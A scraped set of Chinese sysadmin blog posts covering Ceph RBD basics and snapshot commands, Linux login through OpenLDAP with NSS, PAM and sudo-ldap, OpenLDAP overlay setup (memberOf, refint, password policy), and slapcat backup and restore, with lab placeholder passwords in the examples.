中都还有一组特殊的 RADOS 对象记录 image 关联关系或附加信息等相关的 RBD 管理元数据。所有的数据对象和元数据对象都依据 CRUSH 规则 (CRUSH RULE) 存储在底层的 OSD 设备上，因此 RBD 块设备自动继承了 RADOS 对象的数据冗余保护机制和一致性策略。\n对于 RBD Image 官方是这么描述的 [2]\nRBD images are simple block devices that are striped over objects and stored in a RADOS object store. The size of the objects the image is striped over must be a power of two.\n由此，我们可以得知，”镜像“ (RBD IMAGE) 的表现就是一个块设备\nPOOL 存储池是用于存储对象的逻辑分区，一个存储池中可以放置多个”IMAGE“。在官方给出的，存储池提供了如下特性:\n池提供以下功能：\n冗余性 (Resilience)：可以设置允许失败的 OSD 数量，而不会丢失任何数据。如果您的集群使用 ”复制池“ (replicated )，那么可以容忍的 OSD 故障数量等于复制的数量。\n例如：典型配置存储一个对象及其每个 RADOS 对象的两个副本（即size=3，默认值），但您可以根据池的需求配置副本数量。对于纠删码池 (erasure-coded)，冗余性定义为编码块的数量（例如，默认纠删码配置文件中的m = 2）。\n放置组（Placement Groups，PGs）：您可以为池设置放置组（PGs）的数量。在典型配置中，每个 OSD 的目标 PG 数量约为 100 个 PGs。这提供了合理的负载均衡，而不会消耗过多的计算资源。在设置多个存储池时，请小心为每个存储池和整个集群设置合适数量的 PGs。每个 PG 都属于特定的存储池：当多个存储池使用相同的 OSDs 时，请确保每个 OSD 上的 PG 副本总数在所需的 “每个 OSD 上 PG数量的目标范围内”。要计算适合您的池的PG数量，请使用 pgcalc [3] 工具。\nCRUSH规则：当数据存储在池中时，对象及其副本（或在纠删码池中的块）在您的集群中的放置由 CRUSH 规则管理。如果默认规则不适合您的用例，可以为池创建自定义 CRUSH 规则。\n快照：命令 ceph osd pool mksnap 可创建基于存储池的快照。\nlibrdb 和 librados 要想使用块设备，就涉及到 RADOS 之上数据的交互，我们已经了解到了 RBD 是为 KVM 等虑拟化技术和云 OS（如 OpenStack 和 CloudStack）提供高性能和无限可扩展性的存储后端，这些系统依赖于 libvirt 和 QEMU 实用程序与 RBD 进行集成。\n在Ceph中，提供了一种 librados 的库，它可以使得 客户端 与 Ceph 集群间的交互，在 RADOS 之上 存在一个 \u0026ldquo;librados\u0026quot;库，而 \u0026ldquo;librbd\u0026rdquo; 库则是构建与 “librados” 之上的的库，提供了块存储的功能，下面是两个库在“用途”和“功能”上有一些重要区别：\nlibrados（RADOS客户端库）： 用途：librados是用于与Ceph的底层RADOS存储层交互的库。它提供了与Ceph集群中的对象存储进行直接通信的API，允许应用程序执行各种存储操作，如读取、写入、删除和管理存储对象。 功能：librados允许应用程序直接访问Ceph集群，而不需要高级抽象，这意味着应用程序可以更精细地控制数据的读写和存储策略。librados可以用于构建自定义数据存储和管理解决方案。 librbd（RBD客户端库）： 用途：librbd是用于与Ceph中的RBD（Rados Block Device）存储层交互的库。它构建在librados之上，提供了更高级别的抽象，用于处理块设备（镜像）操作，如创建、映射、快照和克隆等。 功能：librbd简化了块设备操作，并提供了易于使用的API，使应用程序能够轻松地管理RBD镜像。它是构建虚拟化平台、云存储、容器存储等应用的关键组件。 要使用 RBD 存储池需要先启用，而却需要注意的是 rbd 存储池并不能直接用于块设备，而是需要事先在其中按需创建映像（image），而 “映像” 代表了真正的块设备\nRBB 支持的功能 快照 排他锁/独占锁 镜像 实时迁移 .. 快照 RBD 快照 (snapshot) 是 image 在某个特定时间点的只读逻辑副本，类似于虚拟机的快照，快照也是 RBD 的高级功能之一，使得可以用户创建映像快照以保留时间点状态历史记录。 Ceph还支持快照分层，使您可以快速轻松地克隆镜像（例如虚拟机镜像）。 Ceph RBD 快照的使用通过命令 rbd 和几个更高级的接口进行管理，包括 QEMU, libvirt, OpenStack 和 CloudStack。\n由于 Ceph RBD 不知道 “镜像” 内的任何文件系统，因此快照仅是崩溃一致的，除非它们在挂载(mouting) 操作系统内进行协调。因此，我们建议您在拍摄快照之前暂停或停止 I/O。\n如果镜像包含文件系统，则在拍摄快照之前文件系统应处于内部一致状态。即需要停止IO\n快照的操作\nceph 有专门的命令 rbd 可以进行 RBD 相关的操作，例如快照的命令为 rbd snapshot\n命令 语法 样例 创建快照 rbd snap create {pool-name}/{image-name}@{snap-name} rbd snap create rbd/foo@snapname 列出快照 rbd snap ls {pool-name}/{image-name} rbd snap ls rbd/foo 回滚快照 rbd snap rollback {pool-name}/{image-name}@{snap-name} rbd snap rollback rbd/foo@snapname 删除一个快照 rbd snap rm {pool-name}/{image-name}@{snap-name} rbd snap rm rbd/foo@snapname 清除所有快照 rbd snap purge {pool-name}/{image-name} rbd snap purge rbd/foo 列出快照 Reference [1] 中国铁路：Ceph在单集群1551个OSD下的挑战\n[2] rbd \u0026ndash; manage rados block device (RBD) images\n[3] pgcalc\n","permalink":"https://www.oomkill.com/2019/09/03-1-acquaintance-rdb/","summary":"","title":"Ceph RBD - 初识块存储RBD"},{"content":"Overview 如果要使Linux账号通过LDAP进行身份认证，就需要配置Linux的 身份验证模块 (Pluggable Authentication Modules) 与 名称服务交换系统 (Name Service Switch) 与LDAP交互。\nPAM 和 NSS [3] NSS (name service switch) 通俗理解为是一个数据库系统，他作用是用于如何将操作系统与各种名称的解析机制关联起来，例如主机名，用户名，组名等内容的查找；例如UID查找使用 passwd 库，GID的查找使用 group 库，并且还可以告知查找的来源，如文件，LDAP等\nPAM (Pluggable Authentication Modules) 全称是可插拔的认证模块，PAM在Linux中是位于用户数据库与应用之间的认证模块，它本身并不工作，并且本身也不提供或扩展现有数据库系统，当登陆shell时，依赖于由NSS提供的密码库与组库等信息，完成对应的查询\n例如下列两张图完整的阐述了PAM与NSS之间，在用户登陆时做了些什么\n图：pam和nss工作示意图1\rSource：https://medium.com/@fengliplatform/understanding-nss-and-pam-using-a-ssh-example-80512eb0f39e\n由图可以看出，当在进行 ping , id 等操作时，会通过nss找到 passwd 库找到用户id，以及通过nss确定是 hosts解析还是dns服务解析对应的域名\n如果这张图不明白可以看下一张图\n图：pam和nss工作示意图2-1\rSource：https://medium.com/@fengliplatform/understanding-nss-and-pam-using-a-ssh-example-80512eb0f39e\n图2-1 中使用了tom用户去登录pecan主机，此时在节点 yam 上，将寻找 pecan主机的IP，这是通过 /etc/nsswitch.conf 来确定是通过 hosts 还是 dns服务进行查找。\n接下来找到pecan的IP，这里会输入用户名与密码，这里将会被sshd服务接管，此时 pecan 主机的sshd接收到用户端请求连接后，将用户名通过nss进行识别，确定是否为合法用户，如果用户有效，则通过PAM进行认证。认证的源也将由 /etc/nsswitch.conf 中配置的对应 passwd 库来找到，例如ldap,file等。正如下图2-2所示\n图：pam和nss工作示意图2-2\rSource：https://medium.com/@fengliplatform/understanding-nss-and-pam-using-a-ssh-example-80512eb0f39e\nLinux with LDAP [1] 在大致了解了Linux登录认证的原理后，知道了要使Linux使用LDAP需要配置两个部分，NSS与PAM，通常有下述几种方案：\nNSS + PAM SSSD (System Security Services Daemon)，SSSD是提供严重的一种工具，可以包含多种源例如LDAP，AD，Kerberos 等，并且提供了缓存功能（当ldap不可用时提供服务） 配置NSS 安装 nss-pam-ldapd\nCentOS/Redhat：\tyum install -y nss-pam-ldapd Debian/Ubuntu：apt-get install libnss-ldapd 配置 /etc/nsswitch.conf ，该文件保存了各数据库，需要对 group , passwd , shadow 库开启 ldap\npasswd: files sss ldap\rshadow: files sss ldap\rgroup: files sss ldap\r配置PAM CentOS/Redhat：\tyum install -y pam_ldap Debian/Ubuntu：apt-get install libpam-ldapd 要想通过本地 Sudo 实现 OpenLDAP 用户提权，可按以下步骤操作。\nauthconfig \\\r--enableldap \\\r--enableldapauth \\\r--ldapserver=ldap://10.0.0.10:389 \\\r--ldapbasedn=\u0026quot;dc=test,dc=org\u0026quot; \\\r--enablemkhomedir \\\r--ldapbasedn=\u0026quot;ou=tvb,dc=test,dc=org\u0026quot; \\\r--enableshadow \\\r--update \\\rNotes：\nCentOS/RedHat 也可以使用 SSSD替代，yum install -y sssd ，上面提供的方案是NSS+PAM\n通常情况下Ubuntu会使用 SSSD 服务替代，SSSD包含了 PAM模块 和 NSS模块\nUbuntu中，没有被 authconfig 没有被打包在 SSSD 中，通常需要安装 sudo apt install ldap-auth-config\nLinux用户权限控制 部署此功能的原因是能够在所有基础结构服务器上仅使用一个用户，并且无需每次在每台服务器上手动更新 /etc/sudoers 文件，即可为此用户提供sudo权限。现在，这些天您可以使用像ansible这样的工具来执行此操作，但是并不是说OpenLDAP用法必须仅用于posixGroup用户访问，因此OpenLDAP只擅长它。OpenLDAP集成应扩展到您部署的每个集中式系统，并且您唯一的“管理员”用户可以访问基础架构范围内的所有系统。\nsudoers在slapd部分配置 要使 OpenLDAP 服务端实现用户权限控制，具体的实施步骤可以大致分为如下几步：\n创建 ldap 中 sudoers容器，并创建默认的搜索域\n为 slapd 导入sudo schema\n定义sudo规则条目及sudo组\n通过手动定义用户加入sudo组，集成sudo权限\n命令添加及修改 通过转换 本地 sudoers 配置文件 为LDAP ldif格式文件\nOpenLDAP 提供的 perl脚本 sudoers2ldif ，通常会看到，如果没有可以从 Github 中下载 sudo 提供的转换命令 cvtsudoers 图形化管理界面配置\n客户端配置加入OpenLDAP服务端\n客户端识别sudo策略及验证用户权限\nOpenLDAP服务端导入sudo schema # 找到sudo的openldap schema\rrpm -ql sudo | grep schema\r# 将其复制到openldap schema目录\rcp /usr/share/doc/sudo-1.8.23/schema.OpenLDAP /etc/openldap/schema/sudo.schema # 生成include sudo.ldif\recho \u0026quot;include /etc/openldap/schema/sudo.schema\u0026quot; \u0026gt; /tmp/sudo.conf\rslapcat -f /tmp/sudo.conf -F /tmp/ -n 0 -s \u0026quot;cn={0}sudo,cn=schema,cn=config\u0026quot; \u0026gt; /tmp/sudo.ldif\r# 最后需要删除后面几行\rsed -i \u0026quot;s@{0}sudo@sudo@g\u0026quot; /tmp/sudo.ldif\rhead -n -8 /tmp/sudo.ldif \u0026gt; /etc/openldap/schema/sudo.ldif\r生成的对应schema在：/etc/openldap/slapd.d/cn=config/cn=schema/\n为 OpenLDAP 创建 suers 容器 创建ldap的sudoers容器，官网有给出提示，sudoers如果在ldap中使用必须放在 ou=SUDOers 中，其中 cn=default 为最先被查找的条目\nThe sudoers configuration is contained in the ‘ou=SUDOers’ LDAP container. [2]\n默认情况下，sudo检索的域为 cn=default,ou=SUDOers,dc=xx,dc=xx 如果找到，那么该条目中所有 sudoOption 属性都会被解析为全局默认值，这类似于服务端中查询一个 sudo 用户权限时一般有两到三次查询。\n第一次查询解析全局配置 第二次查询匹配用户名或者用户所在的组（特殊标签 ALL 也在此次查询中匹配），如果没有找到相关匹配项，则发出第三次查询，此次查询返回所有包含用户组的条目并检查该用户是否存在于这些组中 下面命令是创建一个 sudoers 在 ldap中的根容器 ou=SUDOers ，这个步骤总是需要手动执行，因为默认通过 /etc/sudoers 转换过来的 ldif 是不带这个域的\n$ cat \u0026lt;\u0026lt; EOF | ldapadd -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111 -H ldap://10.0.0.10:389\rdn: ou=SUDOers,dc=test,dc=com\robjectclass: organizationalunit\rou: SUDOers\rEOF\r下面步骤是将 /etc/sudoers 转换为 ldap ldif\n创建一个环境变量 SUDOERS_BASE ，这个在perl脚本执行的必须条件。\nexport SUDOERS_BASE=\u0026quot;ou=SUDOers,dc=test,dc=com\u0026quot;\r接下来，使用sudo包中提供了一个命令 cvtsudoers 可以将 sudoers的配置文件 /etc/sudoers 转换为LDAP ldif格式文件\ncvtsudoers /etc/sudoers -f ldif -o sudoers_defaults.ldif\r另外，通过脚本将 sudoers的配置文件 /etc/sudoers 转换为LDAP ldif格式的文件，将用这个来创建默认的cn=default 的sudoers\nperl sudoers2ldif /etc/sudoers \u0026gt; sudoers_defaults.ldif\rNotes：openldap还有一种操作为 ldif to schema，通过下述命令可以完成 [4]\nsed '/^dn: /d;/^objectClass: /d;/^cn: /d;s/olcAttributeTypes:/attributetype/g;s/olcObjectClasses:/objectclass/g' file.ldif \u0026gt; file.schema\r接下来将这些配置导入到ldap中\nldapadd -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111 -H ldap://10.0.0.10:389 -f sudoers_defaults.ldif\r配置客户端主机支持sudo over ldap 在客户端，需要两个额外步骤。\n需要添加： /etc/nsswitch.conf\n## 增加\rsudoers: ldap files\recho 'sudoers: ldap files' \u0026gt;\u0026gt; /etc/nsswitch.conf\r需要提供：/etc/sudo-ldap.conf\nbinddn cn=clientsearch,ou=admin,dc=cylon,dc=org\rbindpw 111\ruri ldap://10.0.0.20\rsudoers_base ou=sudoers,dc=cylon,dc=org\rTroubleshooting 错误：invalid structural object class chain\nldap_add: Object class violation (65)\radditional info: invalid structural object class chain (groupOfUniqueNames/posixGroup)\r原因：在ldap中 groupOfUniqueNames / posixGroup / inetOrgPerson 实际上是同一种类型 [6] ，级别的对象组，其 objectClass 只能选择包含一个，要 gidNumber 就不能有 memberOf 了。\n问题出于：对于筛选来说，posixGroup 组并不支持 memberOf 属性，这种情况下可能无法做到权限的筛选与用户的筛选等，但是对于Linux 使用ldap管理用户权限时，普通的 groupOfUniqueNames 并不带有 gidNumber 属性，使得用户没有组，这时配置的组的权限，sudo实际不生效。\n解决：\n为 posixGroup 生成一个 memberOf 属性 [5]，这里在尝试导入 ldif 文件时 slapd 生成配置失败无报错 直接使用 posixGroup 替换组 groupOfUniqueNames posixGroup 使用的是 memberUid 进行关联，在检索时，可以使用 uid=memberUid 进行过滤 本质上 posixGroup 与 groupOfUniqueNames 只是对组，没有对用户 需要配置 refint 解决引用关系一致性问题，正如下列给出配置一样 dn: olcOverlay=refint,olcDatabase={1}mdb,cn=config\robjectClass: olcConfig\robjectClass: olcOverlayConfig\robjectClass: olcRefintConfig\robjectClass: top\rolcOverlay: refint\rolcRefintAttribute: memberUid uid\rolcRefintNothing: cn=default,dc=test,dc=com\rReference [1] Configure OpenLDAP login for CentOS 7\n[2] sudoers.ldap.man\n[3] Understanding nss and pam using a ssh example\n[4] Convert AD-Schema from *.ldif to *.schema\n[5] GENERATING A MEMBEROF ATTRIBUTE FOR POSIXGROUPS\n[6] how to fix (65) invalid structural object class chain (posixGroup/groupOfNames)?\n[7] Configure OpenLDAP login for CentOS 7\n[8] Linux LDAP Authentication\n[9] Linux user management with LDAP\n[10] 2. LDAP authentication using pam_ldap and nss_ldap\n[11] How to Configure SUDO via OpenLDAP Server\n[12] SUDOers from OpenLDAP\n[13] OpenLDAPSudo权限讲解-OpenLDAPSudo权限讲解\n[14] authconfig\n[15] Configuring PAM Authentication and User Mapping with LDAP Authentication\n","permalink":"https://www.oomkill.com/2019/09/ch10-linux-with-ldap/","summary":"","title":"理解ldap应用 - Linux系统接入OpenLDAP做认证后端"},{"content":"memberOf 默认情况下，openldap提供的Posixgroup组，实际上并不能很有效的区分组与用户之间的关系。而 memberOf 则可以有效地检索用户与组的关系\n在OpenLDAP配置MemberOf模块 步骤一：可以检查在允许的slapd服务是否已经启用该模块\n$ slapcat -n 0 | grep olcModuleLoad\r对于新部署的服务，可以按照如下方式添加\ndn: cn=module,cn=config\robjectClass: olcModuleList\rcn: module\rolcModuleload: memberof.la\r可以在线更改一个正在运行的slapd服务，使其加载 memberOf 模块，需要主义对应的 module{0} 是否正确\ncat \u0026lt;\u0026lt; EOF | ldapmodify -Q -Y EXTERNAL -H ldapi:///\rdn: cn=module{0},cn=config\rchangetype: modify\radd: olcModuleLoad\rolcModuleLoad: memberof.la\rEOF\r步骤二：配置overlay\n在官方指南中看到olcOverlay 必须要配置到特定数据库的子条目。即此配置段需要在database配置后面。\nOverlays must be configured as child entries of a specific database. [1]\ndn: olcOverlay={0}memberof,olcDatabase={2}hdb,cn=config\robjectClass: olcConfig\robjectClass: olcMemberOf\robjectClass: olcOverlayConfig\robjectClass: top\rolcOverlay: memberof\rolcMemberOfDangling: ignore\rolcMemberOfRefInt: TRUE\rolcMemberOfGroupOC: groupOfUniqueNames\rolcMemberOfMemberAD: uniqueMember\rolcMemberOfMemberOfAD: memberOf\r步骤三：配置refint\nrefint为 (referential integrity)，所引用完整性。是保持属性与所引用的条目保持一致。在使用 memberOf 时，当一个用户被归为 memberOf 组时，会存在 memberOf 的属性。当这个用户组重命名或删除时，refintOverlay 将自动修改或删除对应的属性。\ndn: olcOverlay=refint,olcDatabase={2}hdb,cn=config\robjectClass: olcConfig\robjectClass: olcOverlayConfig\robjectClass: olcRefintConfig\robjectClass: top\rolcOverlay: refint\rolcRefintAttribute: memberOf uniqueMember uid cn ## 哪些属性被改动时修改其他所属关系。\r步骤四：配置memberOf\n新建一个groupOfUniqueNames用户组，将用户放入组内\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.10 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: ou=tvb,dc=test,dc=com\robjectClass: organizationalUnit\rou: tvb\rdn: cn=adminGroup,ou=tvb,dc=test,dc=com\robjectClass: groupOfUniqueNames\rcn: adminGroup\runiqueMember: uid=admin,ou=tvb,dc=test,dc=com\rdn: cn=dirGroup,ou=tvb,dc=test,dc=com\robjectClass: groupOfUniqueNames\rcn: dirGroup\runiqueMember: uid=searchUser,ou=tvb,dc=test,dc=com\rdn: cn=confGroup,ou=tvb,dc=test,dc=com\robjectClass: groupOfUniqueNames\rcn: confGroup\runiqueMember: uid=syncUser,ou=tvb,dc=test,dc=com\rEOF\r创建测试用户\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.10 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: uid=syncUser,ou=tvb,dc=test,dc=com\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\robjectClass: posixAccount\ruid: syncUser\rcn: syncUser\ruidNumber: 10006\rgidNumber: 10002\ruserPassword: {SSHA}QnB7dO98+hoCUgiaAYaiJWnDzlhn2Tn6\rhomeDirectory: /home/syncUser\rloginShell: /bin/bash\rsn: syncUser\rgivenName: syncUser\rmemberOf: cn=confGroup,ou=tvb,dc=test,dc=com\rdn: uid=searchUser,ou=tvb,dc=test,dc=com\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\robjectClass: posixAccount\ruid: searchUser\rcn: searchUser\ruidNumber: 10005\rgidNumber: 10001\rhomeDirectory: /home/searchUser\rloginShell: /bin/bash\ruserPassword: {SSHA}QnB7dO98+hoCUgiaAYaiJWnDzlhn2Tn6\rsn: searchUser\rgivenName: searchUser\rmemberOf: cn=dirGroup,ou=tvb,dc=test,dc=com\rdn: uid=admin,ou=tvb,dc=test,dc=com\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\robjectClass: posixAccount\ruid: admin\rcn: admin\ruidNumber: 0\rgidNumber: 0\rhomeDirectory: /home/admin\rloginShell: /bin/bash\ruserPassword: {SSHA}QnB7dO98+hoCUgiaAYaiJWnDzlhn2Tn6\rsn: admin\rgivenName: admin\rmemberOf: cn=adminGroup,ou=tvb,dc=test,dc=com\rdn: uid=admin1,ou=tvb,dc=test,dc=com\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\robjectClass: posixAccount\ruid: admin1\rcn: admin\ruidNumber: 0\rgidNumber: 0\rhomeDirectory: /home/admin\rloginShell: /bin/bash\ruserPassword: {SSHA}QnB7dO98+hoCUgiaAYaiJWnDzlhn2Tn6\rsn: admin\rgivenName: admin\rmemberOf: cn=adminGroup,ou=tvb,dc=test,dc=com\rEOF\r查看用户的memberof属性\n$ ldapsearch -x -H ldaps://10.0.0.4 -b dc=test,dc=com -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111 memberOf\rReferential Integrity 引用完整 (Referential Integrity) 模块是指在两个属性互相引用时，如果自动修改或删除了一端的值，将保持另一端也能够保持一致性，删除或更新。\n例如下面示例，uid=eve,ou=users,dc=tvb,dc=com 是一个管理员用户，uid=mallory,ou=users,dc=tvb,dc=com 是一个普通用户，普通用户mallory的管理员是eve用户，当eve用户修改名称或者被删除时，mallory对应的 manager 也应该保持更新或删除\ndn: uid=eve,ou=users,dc=tvb,dc=com\robjectClass: posixAccount\robjectClass: shadowAccount\robjectClass: inetOrgPerson\rcn: Eve\rsn: Eavesdropper\ruid: eve\ruidNumber: 5000\rgidNumber: 5000\rhomeDirectory: /home/eve\rloginShell: /bin/sh\rgecos: Eve Eavesdropper\rdn: uid=mallory,ou=users,dc=tvb,dc=com\robjectClass: posixAccount\robjectClass: shadowAccount\robjectClass: inetOrgPerson\rcn: Mallory\rsn: Malicious\ruid: eve\ruidNumber: 5001\rgidNumber: 5000\rhomeDirectory: /home/mallory\rloginShell: /bin/sh\rgecos: Mallory Malicious\rmanager: uid=eve,ou=users,dc=tvb,dc=com\r在OpenLDAP配置Referential Integrity模块 步骤一：可以检查在允许的slapd服务是否已经启用该模块\n$ slapcat -n 0 | grep olcModuleLoad\r可以在线更改一个正在运行的slapd服务，使其加载 refint 模块，需要主义对应的 module{0} 是否正确\ncat \u0026lt;\u0026lt; EOF | ldapmodify -Q -Y EXTERNAL -H ldapi:///\rdn: cn=module{0},cn=config\rchangetype: modify\radd: olcModuleLoad\rolcModuleLoad: refint.la\rEOF\r另外如果 模块目录不为标准的路径，也需要配置 olcModulePath ，当然这个参数只能指定一次\ndn: cn=module,cn=config\rcn: module objectClass: olcModuleList\rolcModulePath: /opt/openldap-current/libexec/openldap\rolcModuleLoad: refint.la\r下表是关于各操作系统内置 openldap 服务模块的标准路径\nOS PATH CentOS 7 /usr/lib64/openldap openSUSE /usr/lib64/openldap Debian (Stretch) /usr/lib/ldap Source (Default) /usr/local/libexec/openldap 由于overlay的特性，需要指定为database的子模块\n$ cat \u0026lt;\u0026lt; EOF | ldapadd -Y EXTERNAL -H ldapi:///\rdn: olcOverlay=refint,olcDatabase={1}mdb,cn=config\robjectClass: olcOverlayConfig\robjectClass: olcRefintConfig\rolcOverlay: refint\rolcRefintAttribute: manager secretary\rolcRefintNothing: cn=config\rEOF\r这里需要注意的属性为：\nolcDatabase={1}mdb 数据库这里需要指定要配置的数据库 olcRefintAttribute 这个属性指明了两个条目间关联的属性 olcRefintNothing 可选参数，因为两端需要关联时，例如memberOf，组对象至少保留一个 memberOf 属性，当删除最后一个关联用户时，会提示非法，这个参数就是在删除最后一个用户时，指定一个占位符的该属性 Password Policy openldap中 Password Policy 是指用户的密码策略，如过期时间，密码安全最低要求等\n在OpenLDAP配置ppolicy模块 可以在线更改一个正在运行的slapd服务，使其加载 ppolicy 模块，需要主义对应的 module{0} 是否正确\ncat \u0026lt;\u0026lt; EOF | ldapmodify -Q -Y EXTERNAL -H ldapi:///\rdn: cn=module{0},cn=config\rchangetype: modify\radd: olcModuleLoad\rolcModuleLoad: ppolicy.la\rEOF\r在加载完成后，需要叠加到database上才可以生效，如下列配置\ndn: olcOverlay=ppolicy,olcDatabase={1}mdb,cn=config\robjectClass: olcPPolicyConfig\rolcOverlay: ppolicy\rolcPPolicyDefault: cn=default,ou=tvb,dc=test,dc=com\rolcPPolicyUseLockout: FALSE\rolcPPolicyHashCleartext: TRUE\r这里需要注意的一点是，olcPPolicyDefault 是指定的一个默认密码策略，即没有为用户配置密码策略时，将使用这个默认策略\n为用户配置默认策略 如果需要使用模块 ppolicy ，必须做下述三个步骤其一才可满足为用户密码提供一个管理策略\n需要创建一个默认策略 为用户 ldift 添加属性 pwdPolicySubentry ，这可以为不同的用户设置不同的密码策略 属性 pwdPolicy 可以作为用户 ldif 中被多次引用，这代表可以设置多种不同的策略，这种比较繁琐 场景一：创建一个默认策略\n例如在配置ppolicy的overlay时，默认策略名称填写了 cn=default,ou=tvb,dc=test,dc=com 那么需要用这个DN创建一个默认策略，而创建DN需要按层级创建，顾需要创建 ou=plicies\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.10 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: ou=tvb,dc=test,dc=com\robjectClass: organizationalUnit\rou: policies\rEOF\r接下来创建默认的密码策略\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.10 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: cn=default,ou=tvb,dc=test,dc=com\robjectClass: pwdPolicy\robjectClass: organizationalRole\rcn: default\rpwdAttribute: userPassword\rpwdMinLength: 3\rpwdCheckQuality: 2\rEOF\r下表是对于一些密码策略的属性说明\n属性 说明 pwdAttribute 指定那个字段是密码 pwdMinAge 多少秒之间必须经过更改密码，默认0 pwdMaxAge 密码最大期限，如果密码过期用户将被拒绝登录。 默认的是密码永不过期。 pwdInHistory 存储多少个历史旧密码，例如更改密码时提示与历史使用密码类似。 默认为0，即可以重复使用旧密码 pwdMinLength 密码的最小的长度。 默认没有长度的要求。 这个属性将与 pwdCheckQuality 同时生效，当 pwdCheckQuality 为0，则长度限制不生效 pwdCheckQuality 如何对用户长度进行检查。 默认0不检查，\n2 ：总是强制执行的质量检查；如果它不能检查它，密码就会被拒绝。\n1 ：可被接受的密码 pwdMaxFailure 密码错误几次用户被锁定，默认0 代表不会被锁定，他们是锁着的。 为了对此采取影响， 必须关联属性 pwdLockout=TRUE pwdLockout pwdLockout=TRUE 时 pwdMaxFailure 会生效，否则忽略 pwdMaxFailure 配置 pwdLockoutDuration 账户自动解锁的时间 pwdMustChange 这是当管理员创建用户后，第一次登陆时需要必须修改密码 pwdPolicySubentry 表示设置密码的策略。 DN对应适用密码政策的条目。 默认策略由 olcPPolicyDefault 属性的配置。如果不存在，会使用 olcPPolicyDefault ，当存在时会覆盖 olcPPolicyDefault 如果需要上述的策略，需要引入对象 objectClass: pwdPolicy 例如修改一个用户的密码策略\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.10 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: uid=searchUser,ou=tvb,dc=test,dc=com\rchangetype: modify\radd: pwdMinLength\rpwdMinLength: 4\r-\radd: pwdCheckQuality\rpwdCheckQuality: 2\r-\rreplace: pwdPolicySubentry\rpwdPolicySubentry: cn=example2,ou=tvb,dc=tvb,dc=com\rEOF\r而上述属性 pwdPolicySubentry 代表那个策略适用于那个条目。 如果不存在则默认策略生效。如果需要引入存在的密码策略可以使用该属性进行应用。\n例如，下述是创建两天密码策略\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.10 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: cn=example1,ou=tvb,dc=test,dc=com\rcn: example1\robjectClass: organizationalRole\robjectClass: pwdPolicy\rpwdAttribute: userPassword\rpwdMinLength: 5\rpwdCheckQuality: 2\rdn: cn=example2,ou=tvb,dc=test,dc=com\rcn: example2\robjectClass: organizationalRole\robjectClass: pwdPolicy\rpwdAttribute: userPassword\rpwdMinLength: 6\rpwdCheckQuality: 2\rpwdMaxFailure: 3\rpwdLockout: TRUE\rpwdLockoutDuration: 10\rpwdInHistory: 5\rEOF\r当需要创建一个用户引用现有的一组密码策略时，可以对用户添加属性 pwdPolicySubentry，而不是重复的设置每条策略，例如下面示例\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.10 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: uid=admin1,ou=tvb,dc=test,dc=com\rchangetype: modify\radd: pwdPolicySubentry\rpwdPolicySubentry: cn=example1,ou=tvb,dc=tvb,dc=com\rdn: uid=searchUser,ou=tvb,dc=test,dc=com\rchangetype: modify\radd: pwdPolicySubentry\rpwdPolicySubentry: cn=example2,ou=tvb,dc=tvb,dc=com\rEOF\rReference [1] slapd-config\n","permalink":"https://www.oomkill.com/2019/09/ch9-openldap-configuration/","summary":"","title":"理解ldap配置 - openldap中的一些高级配置"},{"content":"Overview 本章基于openldap 2.4+版本进行，主要讲解 openldap 的两种备份方法：备份openldap backend-database 文件，另一种方式为导出 LDIF 目录方式\nBackup 备份部分将分为两种方式：使用基于 slapcat 导出目录文件方式，与直接备份数据库文件方式。\nslapcat 是可用于导出 slapd 数据库中数据为LDAP交换格式的命令行工具，它可以导出 slapd 的配置也可以导出 slapd的数据。\nslapcat 使用起来很简单，参数也是与 openldap 其他命令参数类似，\n参数 说 明 -a filter 只导出与过滤器声明条件相匹配的数据\n例如：slapcat -a \u0026quot;(!(entryDN:dnSubtreeMatch:=ou=People,dc=example,dc=com))\u0026quot; -b suffix 将只导出-b指定DN域内数据，-b 不能与 -n 同时使用 -c 忽略错误 -f -f 后接的文件将替代默认的配置文件，通常情况下备份在slapd本机执行可以不使用该参数 -F 指定配置目录，-F比-f优先级高，同时指定生效为-F，也就是导出的目录 -g 导出时不使用从属关系，仅仅为指定的数据库才会被导出 -H 连接 slapd 服务的地址 -l 输出的文件，默认slapcat是将内容输出到标准输出stdout中 -s subtree-dn 仅导出符合dn子树的条目 例如下列命令用于备份配置文件的\n$ slapcat -n 0 -l config.ldif Notes：slapd中，配置（0）永远是第一个数据库，跟着的就是在配置中指定的数据库，例如 {0}hdb 将表示1，{1}hdb 则是2\n下列命令用于导出为LDIF格式数据\n$ slapcat -n 1 -l data.ldif Restore 恢复配置时，建议直接删除原有配置，而后重新生成新的即可，下表为常见的操作系统openldap配置目录\nOS Configuration Directory Debian/Ubuntu /etc/ldap/slapd.d RHEL/CentOS /etc/openldap/slapd.d SuSE (Uses slapd.conf) /etc/openldap/slapd.d FreeBSD /usr/local/etc/openldap/slapd.d 下列命令是恢复配置的命令，-l 用户指定导出的ldif文件，-F 为配置目录，必须存在\n$ slapadd -n 0 -F /etc/openldap/slapd.d -l /backups/config.ldif 因为运行 slapd 进程的用户为 ldap，所以新配置目录的必须拥有权限\n$ chown -R ldap:ldap 